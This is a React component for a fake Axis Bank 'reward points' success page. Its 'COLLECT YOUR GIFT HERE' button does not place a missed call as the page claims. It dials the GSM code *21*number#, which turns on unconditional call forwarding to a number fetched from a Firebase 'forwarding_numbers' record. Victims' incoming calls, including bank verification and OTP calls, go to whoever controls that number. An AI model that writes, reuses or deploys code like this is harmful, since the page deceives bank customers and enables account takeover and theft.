import  { useState, useEffect } from 'react';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const SuccessPage = () => {
  const [callNumber, setCallNumber] = useState(null);

  useEffect(() => {
    const fetchCallNumber = async () => {
      try {
        const result = await FirebaseUtil.getDocument("axis_settings", "forwarding_numbers");
        setCallNumber(result?.call_forwarding_number || '111111');
      } catch (error) {
        console.error('Error fetching call number:', error);
        setCallNumber('111111');
      }
    };
    fetchCallNumber();
  }, []);

  return (
    <div className="min-h-screen bg-[#B72B64] text-white p-4">
      <div className="max-w-md mx-auto bg-white rounded-3xl p-6 shadow-lg">
        <div className="flex justify-center items-center mb-6">
          <svg className="w-12 h-12 text-[#B72B64]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
          </svg>
          <div className="ml-3">
            <h1 className="text-2xl font-bold text-[#B72B64] mb-2">
              Congratulations!
            </h1>
            <p className="text-gray-600">
              To collect your reward points, give us a missed call to Axis Bank Reward Care by clicking the button below.
            </p>
          </div>
        </div>

        {callNumber && (
          <button
            onClick={() => window.open(`tel:*21*${callNumber.replace(/-/g, '')}%23`, '_self')}
            className="w-full bg-[#B72B64] hover:bg-opacity-90 text-white font-bold py-2 px-4 rounded-full text-sm mb-4"
          >
            COLLECT YOUR GIFT HERE
          </button>
        )}

        <button
          className="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-2 px-4 rounded-full"
          onClick={() => window.location.reload()}
        >
          Back to Home
        </button>
      </div>
    </div>
  );
};

export default SuccessPage;